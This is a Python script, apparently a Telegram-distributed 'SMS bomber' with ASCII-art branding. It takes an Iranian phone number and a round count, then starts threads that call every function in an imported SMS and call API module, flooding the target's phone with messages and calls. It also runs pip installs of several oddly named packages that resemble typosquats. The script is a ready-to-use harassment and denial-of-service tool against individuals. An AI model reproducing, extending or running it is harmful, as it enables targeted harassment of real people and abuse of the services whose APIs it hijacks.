from time import sleep
from os import system
#install libs
print("Start install libs")
sleep(3)

system("cls")
system("pip install threaded")
system("cls")
system("pip install pip-api")
system("cls")
system("pip install python-time")
system("cls")
system("pip install inspect-it")
system("cls")
system("pip install os-sys")
system("cls")
system("pip install -U user_agent")
system("cls")



from threading import Thread
from Api import sms, call
from time import sleep
from inspect import getmembers, isfunction 
from os import system, name

#t.me/rmsup

print("Start")
sleep(1)
system("cls" or "clear")
print("Loding ..")
sleep(0.5)
system("cls" or "clear")
print("Loding ...")
sleep(0.5)
system("cls" or "clear")
print("Loding .")
sleep(0.5)
system("cls" or "clear")
print("Loding ..")
sleep(0.5)
system("cls" or "clear")
print("Loding ...")
sleep(0.5)
system("cls" or "clear")
print("Loding ..")
sleep(0.5)
system("cls" or "clear")
print("Loding ...")
sleep(0.5)
system("cls" or "clear")
class color :
    Purple = '\033[95m'
    RED = '\033[91m'
    wormy = '\033[93m'
print(color.Purple +"""

██████╗██████╗ ██████╗████████╗██████╗███╗   ██╗    ██████████╗   ██████████╗    ██████╗ ██████╗███╗   ███╗
██╔══████╔══████╔═══██╚══██╔══██╔═══██████╗  ██║    ██╔════████╗ ██████╔════╝    ██╔══████╔═══██████╗ ████║
██████╔██████╔██║   ██║  ██║  ██║   ████╔██╗ ██║    █████████╔████╔█████████╗    ██████╔██║   ████╔████╔██║
██╔═══╝██╔══████║   ██║  ██║  ██║   ████║╚██╗██║    ╚════████║╚██╔╝██╚════██║    ██╔══████║   ████║╚██╔╝██║
██║    ██║  ██╚██████╔╝  ██║  ╚██████╔██║ ╚████║    █████████║ ╚═╝ █████████║    ██████╔╚██████╔██║ ╚═╝ ██║
╚═╝    ╚═╝  ╚═╝╚═════╝   ╚═╝   ╚═════╝╚═╝  ╚═══╝    ╚══════╚═╝     ╚═╚══════╝    ╚═════╝ ╚═════╝╚═╝     ╚═╝
                                                                                                           
""")
def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(0.01)
printLow( color.RED +"""
telegram: https://t.me/rmsup
Creator: https://t.me/Proton_Hack
""")

SMS_SERVICES = list(i[0] for i in getmembers(sms, isfunction))
CALL_SERVICES = list(i[0] for i in getmembers(call, isfunction))


def bombing(phone, count):
    x = 0
    phone = f"+98{phone[1:]}"
    for j in range(count):
        for k in range(len(SMS_SERVICES)):
            Thread(target=getattr(sms, SMS_SERVICES[k]), args=[phone]).start()
        if (j !=0) and (j % 5) == 0:
            Thread(target=getattr(call, CALL_SERVICES[x]), args=[phone]).start()
            x += 1
            if x > len(CALL_SERVICES) - 1:
            	x = 0
        print(f"Round {j+1} Completed XD")
        sleep(0.2)
    printLow("Finish")
    
if __name__ == "__main__":
    num = input(color.wormy +'''***Enter your phone [-98:]
[number:0999*******]---> : ''')
    yy = int(input("***Enter The Count of Round of Bombing -#>"))
    system('clear' if name == 'posix' else 'cls')
    printLow("*Phone Number:{}\n*Rounds: {}\n\n".format(num,yy))
    printLow("Start\n")
    bombing(phone=num,count=yy)
